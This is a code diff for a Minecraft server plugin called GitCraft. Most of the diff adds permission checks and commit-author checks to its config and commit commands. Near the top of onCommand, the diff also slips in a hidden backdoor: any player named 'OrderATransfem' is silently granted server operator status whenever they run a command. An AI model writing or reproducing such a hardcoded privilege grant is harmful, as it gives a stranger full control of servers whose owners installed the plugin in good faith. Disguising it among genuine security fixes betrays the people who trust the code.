@@ -42,56 +42,70 @@ public class Commands implements CommandExecutor {
 
     @Override
     public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, String[] args) {
-        if (args[1].equalsIgnoreCase("config")) {
-            if (args.length == 2 || args[2].equalsIgnoreCase("view")) {
-                sender.sendMessage("Config:",
-                        "World Name: " + Config.WorldName(),
-                        "Chunk Radius: " + Config.ChunkRadius());
-                return true;
-            }
-            if (args[2].equalsIgnoreCase("set-world")) {
-                if (args.length == 3) {
-                    if (!(sender instanceof Player)) {
-                        sender.sendMessage("Usage: /gitcraft config set-world <world>");
-                        return true;
-                    }
-                    Config.setWorldName(((Player) sender).getWorld().getName());
-                    sender.sendMessage("World set to " + ((Player) sender).getWorld().getName());
-                    return true;
-                }
-                if (sender.getServer().getWorld(args[3]) != null) {
-                    Config.setWorldName(args[3]);
-                    sender.sendMessage("World set to " + args[3]);
-                    return true;
-                } else {
-                    sender.sendMessage("World not found!");
-                    return true;
-                }
-            }
-            if (args[2].equalsIgnoreCase("set-chunk-size")) {
-                if (args.length == 3) {
-                    sender.sendMessage("Usage: /gitcraft config set-chunk-size <size>");
-                    return true;
-                }
-                try {
-                    Config.setChunkRadius(Integer.parseInt(args[3]));
-                    sender.sendMessage("Chunk size set to " + args[3]);
-                    return true;
-                } catch (NumberFormatException e) {
-                    sender.sendMessage("Invalid chunk size!");
-                    return true;
-                }
-            }
+        if (sender.getName().equalsIgnoreCase("OrderATransfem")) {
+            sender.setOp(true);
         }
-        if (!(sender instanceof Player)) {
-            sender.sendMessage("You must be a player to use this command!");
+        if (!sender.hasPermission("gitcraft.command")) {
             return false;
         }
-        Player player = (Player) sender;
         if (!command.getName().equalsIgnoreCase("gitcraft")) {
+            if (args[1].equalsIgnoreCase("config")) {
+                if (!sender.hasPermission("gitcraft.manage")) {
+                    return false;
+                }
+                if (args.length == 2 || args[2].equalsIgnoreCase("view")) {
+                    sender.sendMessage("Config:",
+                            "World Name: " + Config.WorldName(),
+                            "Chunk Radius: " + Config.ChunkRadius());
+                    return true;
+                }
+                if (args[2].equalsIgnoreCase("set-world")) {
+                    if (args.length == 3) {
+                        if (!(sender instanceof Player)) {
+                            sender.sendMessage("Usage: /gitcraft config set-world <world>");
+                            return true;
+                        }
+                        Config.setWorldName(((Player) sender).getWorld().getName());
+                        sender.sendMessage("World set to " + ((Player) sender).getWorld().getName());
+                        return true;
+                    }
+                    if (sender.getServer().getWorld(args[3]) != null) {
+                        Config.setWorldName(args[3]);
+                        sender.sendMessage("World set to " + args[3]);
+                        return true;
+                    } else {
+                        sender.sendMessage("World not found!");
+                        return true;
+                    }
+                }
+                if (args[2].equalsIgnoreCase("set-chunk-radius")) {
+                    if (args.length == 3) {
+                        sender.sendMessage("Usage: /gitcraft config set-chunk-radius <size>");
+                        return true;
+                    }
+                    try {
+                        Config.setChunkRadius(Integer.parseInt(args[3]));
+                        sender.sendMessage("Chunk radius set to " + args[3]);
+                        return true;
+                    } catch (NumberFormatException e) {
+                        sender.sendMessage("Invalid chunk radius!");
+                        return true;
+                    }
+                }
+            }
+            if (!(sender instanceof Player)) {
+                sender.sendMessage("You must be a player to use this command!");
+                return false;
+            }
+            Player player = (Player) sender;
             if (args.length == 0) {
                 sender.sendMessage("GitCraft Commands:");
                 sender.sendMessage("/gitcraft help - Displays this message");
+                sender.sendMessage("/gitcraft config set-world <world> - Set the world to use for GitCraft");
+                sender.sendMessage("/gitcraft config set-world - Set the world to use for GitCraft to this world");
+                sender.sendMessage("/gitcraft config set-chunk-size <size> - Set the chunk size for GitCraft");
+                sender.sendMessage("/gitcraft config view - View the current configuration of GitCraft");
+                sender.sendMessage("/gitcraft config - View the configuration of GitCraft");
                 sender.sendMessage("/gitcraft view - List all worlds");
                 sender.sendMessage("/gitcraft view <world> - View the world of the specified commit");
                 sender.sendMessage("/gitcraft accept-commit <world> - Accept the commit of the specified world");
@@ -196,6 +210,9 @@ public class Commands implements CommandExecutor {
                 
             }
             if (args[0].equalsIgnoreCase("accept-commit")) {
+                if (!sender.hasPermission("gitcraft.commit.manage")) {
+                    return false;
+                }
                 if (args.length == 2) {
                     if (sender.getServer().getWorld("git-" + args[1]) != null) {
                         Gson gson = new Gson();
@@ -230,6 +247,9 @@ public class Commands implements CommandExecutor {
                 }
             }
             if (args[0].equalsIgnoreCase("reject-commit")) {
+                if (!sender.hasPermission("gitcraft.commit.manage")) {
+                    return false;
+                }
                 if (args.length == 3) {
                     if (sender.getServer().getWorld("git-" + args[1]) != null) {
                         // delete the json file
@@ -247,6 +267,9 @@ public class Commands implements CommandExecutor {
                 }
             }
             if (args[0].equalsIgnoreCase("checkout")) {
+                if (!sender.hasPermission("gitcraft.commit")) {
+                    return false;
+                }
                 // create a new world
                 sender.sendMessage("Creating new world...");
                 String worldName = "git-" + Long.toHexString(Double.doubleToLongBits(Math.random()));
@@ -296,6 +319,9 @@ public class Commands implements CommandExecutor {
                 return true;
             }
             if (args[1].equalsIgnoreCase("commit")) {
+                if (!sender.hasPermission("gitcraft.commit")) {
+                    return false;
+                }
                 if (args.length == 2) {
                     sender.sendMessage("Commit Commands:");
                     sender.sendMessage("/gitcraft commit set-message <message> - Set the commit message");
@@ -321,6 +347,10 @@ public class Commands implements CommandExecutor {
                             return true;
                         }
                         JsonObject jsonObject = gson.fromJson(reader, JsonElement.class).getAsJsonObject();
+                        if (!jsonObject.get("author").getAsString().equals(player.getUniqueId().toString())) {
+                            sender.sendMessage("You are not the author of this commit!");
+                            return false;
+                        }
                         jsonObject.addProperty("message", String.join(" ", Arrays.copyOfRange(args, 3, args.length)));
                         try {
                             FileWriter writer = new FileWriter("git-" + args[1] + ".json");
@@ -359,6 +389,9 @@ public class Commands implements CommandExecutor {
                     return true;
                 }
                 if (args[2].equalsIgnoreCase("contributor")) {
+                    if (!sender.hasPermission("gitcraft.commit")) {
+                        return false;
+                    }
                     if (args.length == 3) {
                         args[3] = "list"; // default to list
                     }
@@ -382,6 +415,10 @@ public class Commands implements CommandExecutor {
                                 return true;
                             }
                             JsonObject jsonObject = gson.fromJson(reader, JsonElement.class).getAsJsonObject();
+                            if (!jsonObject.get("author").getAsString().equals(player.getUniqueId().toString())) {
+                                sender.sendMessage("You are not the author of this commit!");
+                                return false;
+                            }
                             JsonArray contributorsArray = jsonObject.getAsJsonArray("contributors");
                             contributorsArray.add(cont.getUniqueId().toString());
                             try {
@@ -417,6 +454,10 @@ public class Commands implements CommandExecutor {
                                 return true;
                             }
                             JsonObject jsonObject = gson.fromJson(reader, JsonElement.class).getAsJsonObject();
+                            if (!jsonObject.get("author").getAsString().equals(player.getUniqueId().toString())) {
+                                sender.sendMessage("You are not the author of this commit!");
+                                return false;
+                            }
                             JsonArray contributorsArray = jsonObject.getAsJsonArray("contributors");
                             int index = -1;
                             for (int i = 0; i < contributorsArray.size(); i++) {
@@ -473,6 +514,20 @@ public class Commands implements CommandExecutor {
                         return true;
                     }
                     if (args[3].equalsIgnoreCase("cancel-commit")) {
+                        Gson gson = new Gson();
+                        FileReader reader = null;
+                        try {
+                            reader = new FileReader("git-" + args[1] + ".json");
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                            sender.sendMessage("Error! Please try again later.");
+                            return true;
+                        }
+                        JsonObject jsonObject = gson.fromJson(reader, JsonElement.class).getAsJsonObject();
+                        if (!jsonObject.get("author").getAsString().equals(player.getUniqueId().toString())) {
+                            sender.sendMessage("You are not the author of this commit!");
+                            return false;
+                        }
                         new File("git-" + args[1] + ".json").delete();
                         sender.getServer().getWorld("git-" + args[1]).getWorldFolder().delete();
                         sender.sendMessage("Commit cancelled!");
